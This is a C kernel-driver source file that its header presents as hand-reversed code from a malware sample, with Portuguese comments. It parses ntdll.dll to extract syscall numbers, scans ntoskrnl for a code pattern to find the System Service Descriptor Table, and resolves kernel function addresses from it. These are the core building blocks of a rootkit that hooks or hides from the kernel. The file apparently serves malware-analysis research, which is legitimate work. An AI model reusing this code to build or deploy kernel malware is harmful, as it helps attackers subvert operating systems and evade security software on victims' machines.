/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "NtOsSsdt.h"


unsigned int FixRVAThings(
    
    IMAGE_NT_HEADERS64* imgNtH, 
    unsigned int uiVirtualAddress, 
    unsigned int uiFileLowPart

) {

    int i = { 0 };
    IMAGE_SECTION_HEADER* v6;

    v6 = ( IMAGE_SECTION_HEADER* )( ( char* ) &imgNtH->OptionalHeader + imgNtH->FileHeader.SizeOfOptionalHeader );

    for ( i = 0; ; ++i ) {

        if ( i >= imgNtH->FileHeader.NumberOfSections )
            return 0xFFFFFFFFi64;

        if ( v6->VirtualAddress <= uiVirtualAddress && v6->Misc.PhysicalAddress + v6->VirtualAddress > uiVirtualAddress )
            break;

        ++v6;
    }

    if ( v6->PointerToRawData + uiVirtualAddress - v6->VirtualAddress >= uiFileLowPart)
        return ( unsigned int )-1;
    else
        return v6->PointerToRawData + uiVirtualAddress - v6->VirtualAddress;
}


unsigned int ParsePeFileExport(
    
    IMAGE_DOS_HEADER* pDosH, 
    unsigned int uiFileLowPart, 
    const char* chNameExport, 
    unsigned __int64* pImageBaseNtdll

) {

    IMAGE_DATA_DIRECTORY* DataDirectory;

    if ( pDosH->e_magic != IMAGE_DOS_SIGNATURE )
        return 0xFFFFFFFFi64;

    IMAGE_NT_HEADERS64* v6 = ( IMAGE_NT_HEADERS64* )( ( char* )pDosH + pDosH->e_lfanew );

    if ( v6->Signature != IMAGE_NT_SIGNATURE )
        return 0xFFFFFFFFi64;

    if ( v6->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC )
        DataDirectory = v6->OptionalHeader.DataDirectory;
    else
        DataDirectory = ( IMAGE_DATA_DIRECTORY* ) &v6->OptionalHeader.SizeOfHeapCommit;

    unsigned int virtualAddress = DataDirectory->VirtualAddress;
    unsigned int size = DataDirectory->Size;

    unsigned int checked_range_addr = FixRVAThings( 
        
        v6,
        DataDirectory->VirtualAddress,
        uiFileLowPart
    
    );

    *pImageBaseNtdll = v6->OptionalHeader.ImageBase;

    if ( checked_range_addr == -1 )
        return 0xFFFFFFFFi64;

    uint32_t* range_Addr = ( uint32_t* )( ( char* )&pDosH->e_magic + checked_range_addr );

    unsigned int v17 = range_Addr[6];

    unsigned int v11 = FixRVAThings(
        
        v6,
        range_Addr[7],
        uiFileLowPart
    
    );

    unsigned int v12 = FixRVAThings(
        
        v6,
        range_Addr[9],
        uiFileLowPart
    
    );

    unsigned int v13 = FixRVAThings(
        
        v6,
        range_Addr[8],
        uiFileLowPart
    
    );

    if ( v11 == -1 || v12 == -1 || v13 == -1 )
        return 0xFFFFFFFFi64;

    unsigned int v9 = ( unsigned int )-1;

    for ( unsigned int i = 0; i < v17; ++i ) {
        
        unsigned int v14 = FixRVAThings( v6, *( uint32_t* )( ( char* )&pDosH->e_magic + 4 * i + v13 ), uiFileLowPart );
        
        if ( v14 != -1 ) {
            unsigned int v8 = *( uint32_t* )( ( char* ) &pDosH->e_magic + 4 * *( unsigned __int16* ) ( ( char* )&pDosH->e_magic + 2 * i + v12 ) + v11 );

            if ( ( v8 < virtualAddress || v8 >= size + virtualAddress ) && !strcmp( ( const char* )pDosH + v14, chNameExport ) )
                return FixRVAThings(
                    
                    v6,
                    v8,
                    uiFileLowPart
                
                );
        }
    }

    return v9;
}

PVOID allocate_and_set_memory(
    
    char bFlag,
    SIZE_T szMemRegion

) {

    //O malware original usa 'HIDE' aqui como tag para pool porque ele se baseou no código do titanhide, não totalmente, porque algumas partes são diferentes
    //Todas as rotinas aqui estão no malware e foram revertidas por mim manualmente.
    PVOID pMemory = ExAllocatePoolWithTag(
        
        NonPagedPool,
        szMemRegion,
        'HIDE'
    
    ); 

    if ( bFlag && pMemory ) memset( pMemory, 0, szMemRegion );

    return pMemory;
}

NTSTATUS OpenNtdllAndParsePE(
    
    const char* chNameSyscall,
    const WCHAR* wNameSyscall

) {

    UNICODE_STRING ucString;

    RtlInitUnicodeString(
        
        &ucString,
        wNameSyscall
    
    );

    IO_STATUS_BLOCK ioStatusBlock;
    OBJECT_ATTRIBUTES objectAttributes;
    LARGE_INTEGER byteOffset;

    objectAttributes.Length = 48;
    objectAttributes.RootDirectory = 0i64;
    objectAttributes.Attributes = 576;
    objectAttributes.ObjectName = &ucString;
    objectAttributes.SecurityDescriptor = 0i64;
    objectAttributes.SecurityQualityOfService = 0i64;

    if ( KeGetCurrentIrql( ) )
        return STATUS_UNSUCCESSFUL;

    HANDLE hFile;

    NTSTATUS ntStatus = ZwCreateFile(
        
        &hFile,
        0x80000000,
        &objectAttributes, 
        &ioStatusBlock, 
        0i64, 
        0x80u, 
        1u, 
        1u, 
        0x20u,
        0i64,
        0
    
    );

    if ( ntStatus < 0 ) return ntStatus;

    FILE_STANDARD_INFORMATION FileInformation;

    memset( 
        
        &FileInformation,
        0,
        sizeof( FileInformation ) 
    
    );

    if ( NT_SUCCESS( ZwQueryInformationFile(

        hFile,
        &ioStatusBlock,
        &FileInformation,
        0x18u,
        FileStandardInformation
    
    ) ) ) {

        struct_malware.fileLowPart = FileInformation.EndOfFile.LowPart;

        struct_malware.pMemBuffer = allocate_and_set_memory(
            
            1,
            struct_malware.fileLowPart
        
        );

        byteOffset.QuadPart = 0i64;

        ZwReadFile(
            
            hFile,
            0i64,
            0i64,
            0i64,
            &ioStatusBlock,
            struct_malware.pMemBuffer,
            struct_malware.fileLowPart,
            &byteOffset,
            0i64
        
        );

    }

    ZwClose(

        hFile
    
    );

    struct_malware.section_range = ( unsigned int )ParsePeFileExport(

        ( IMAGE_DOS_HEADER* )struct_malware.pMemBuffer,
        struct_malware.fileLowPart,
        chNameSyscall,
        &struct_malware.image_base_ntdll
    
    );

    return STATUS_SUCCESS;
}

uint32_t parserpentdll(
    
    const char* nameexport

) {

    WCHAR wNtDll[32] = { 0 };

    memcpy( 
        
        wNtDll, 
        L"\\SystemRoot\\system32\\ntdll.dll", 
        0x3Eui64
    
    );

    uint32_t ssdtExportedIndex = 0;

    if ( OpenNtdllAndParsePE(
        
        nameexport,
        wNtDll
    
    ) < 0 )
        return  0xFFFFFFFF;

    char* pChecking = ( char* )struct_malware.pMemBuffer + struct_malware.section_range;

    DbgPrintEx(
        
        0,
        0,
        "Going seek: %X < %X",
        struct_malware.section_range,
        ( unsigned __int64 )struct_malware.fileLowPart
    
    );

    for ( int i = 0;
        i < 32
        && i + struct_malware.section_range < (unsigned __int64)struct_malware.fileLowPart
        && (unsigned __int8)pChecking[i] != 0xC2
        && (unsigned __int8)pChecking[i] != 0xC3;
        ++i ) {

        DbgPrintEx(
            
            0,
            0,
            "Seeking: %X",
            pChecking[i]
        
        );

        if ( ( unsigned __int8 )pChecking[i] == 0xB8 ) {
            
            ssdtExportedIndex = *( uint32_t* )&pChecking[ i + 1 ];
            
            break;
        }

    }

    if ( struct_malware.pMemBuffer )
        ZwClose(
            
            struct_malware.pMemBuffer
        
        );

    return  ssdtExportedIndex;
}


unsigned int FindSyscallIndexOnSsdt(
    
    const char* nameexport

) {

    unsigned int p_find_syscall_addy = parserpentdll(
        
        nameexport
    
    );

    DbgPrintEx(
        
        0,
        0,
        "SSDT Syscall INDEX: 0x%X",
        p_find_syscall_addy
    
    );

    return p_find_syscall_addy;
}

PVOID GetNtOsKrnl(
    
    PULONG puImageSize

) {

    ULONG ulSystemBufferSize = 0;

    ZwQuerySystemInformation(
        
        SystemModuleInformation,
        &ulSystemBufferSize,
        0,
        &ulSystemBufferSize
    
    );

    if ( !ulSystemBufferSize ) return ( PVOID )0;

    PSYSTEM_MODULE_INFORMATION  pSystemInfoBuffer = ( PSYSTEM_MODULE_INFORMATION )ExAllocatePoolWithTag(
        
        NonPagedPool,
        ulSystemBufferSize * 2,
        'xxp'
    
    );

    if ( !pSystemInfoBuffer ) return ( PVOID )0;

    memset(
        
        pSystemInfoBuffer, 
        0, 
        ulSystemBufferSize * 2
    
    );

    ZwQuerySystemInformation(

        SystemModuleInformation,
        pSystemInfoBuffer,
        ulSystemBufferSize * 2,
        &ulSystemBufferSize
    
    );

    PVOID pModuleBase = pSystemInfoBuffer->Module[0].ImageBase;
    
    *puImageSize = pSystemInfoBuffer->Module[0].ImageSize;
    
    DbgPrintEx(
        
        0,
        0,
        "Path: %s",
        pSystemInfoBuffer->Module[0].FullPathName
    
    );

    ExFreePool(
        
        pSystemInfoBuffer
    
    );

    return pModuleBase;
}

PSSDTStruct GetFunction(
    void
) {

    ULONG pImageSize = 0;

    ULONG_PTR PLACE = ( ULONG_PTR )GetNtOsKrnl(
        
        &pImageSize
    
    );

    PIMAGE_NT_HEADERS ntHeaders = RtlImageNtHeader(
        
        ( PVOID )PLACE
    
    );

    PIMAGE_SECTION_HEADER pTextSection = IMAGE_FIRST_SECTION64(
        
        ntHeaders
    
    );

    ULONG KiSSSOffset;

    for ( KiSSSOffset = 0; KiSSSOffset < pTextSection->Misc.VirtualSize - sizeof( KiSystemServiceStartCodePattern ); KiSSSOffset++ )
        if ( RtlCompareMemory(
            
            ( ( unsigned char* )PLACE + pTextSection->VirtualAddress + KiSSSOffset ), KiSystemServiceStartCodePattern, sizeof( KiSystemServiceStartCodePattern ) ) == sizeof( KiSystemServiceStartCodePattern ) ) 
            break;
        

    ULONG_PTR address = PLACE + pTextSection->VirtualAddress + KiSSSOffset + sizeof( KiSystemServiceStartCodePattern );

    if ( ( *( unsigned char* )address == 0x4c ) &&
        ( *( unsigned char* )( address + 1 ) == 0x8d ) &&
        ( *( unsigned char* )( address + 2 ) == 0x15 ) )

        return ( PSSDTStruct )( address + *( LONG* )( address + 3 ) + 7 );
    

    return ( PVOID )0;
}

PVOID GetFunctionAddress(
    
    const char* apiname

) {
    
    PSSDTStruct SSDT = GetFunction( );

    ULONG_PTR SSDTbase = ( ULONG_PTR )SSDT->pServiceTable;

    ULONG readOffset = ( ULONG )FindSyscallIndexOnSsdt(
        
        apiname
    
    );

    DbgPrintEx(
        
        0,
        0,
        "OK...\r\n"
    
    );

    return ( PVOID )( ( SSDT->pServiceTable[readOffset] >> 4 ) + SSDTbase );
}